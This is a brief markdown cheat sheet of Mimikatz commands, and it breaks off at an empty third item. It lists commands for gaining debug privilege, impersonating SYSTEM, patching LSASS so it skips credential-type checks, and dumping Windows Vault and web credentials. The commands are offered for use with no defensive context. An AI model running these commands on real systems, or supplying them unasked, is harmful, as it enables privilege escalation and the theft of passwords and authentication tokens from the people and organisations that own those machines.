# MIMIKATZ

## Author: https://github.com/gentilkiwi/mimikatz

### Miscellaneous

1) Shows privileges on machine ( Ensure output is "20 OK")

        privilege::debug

2) Impersonate SYSTEM

        token::elevate

De-escalate from SYSTEM

        token::revert

3) Altering LSASS Logic (Dump network share credentials, RDP passwords, etc. Not recommended.)

Prevent LSASS from checking the credential type

        sekurlsa::patch 

### Credentials Dumping

1) Windows Vault stored credentials dumping (passwords and authentication tokens)

       vault::cred

2) Web Credentials Dumping

       vault::list

3) 


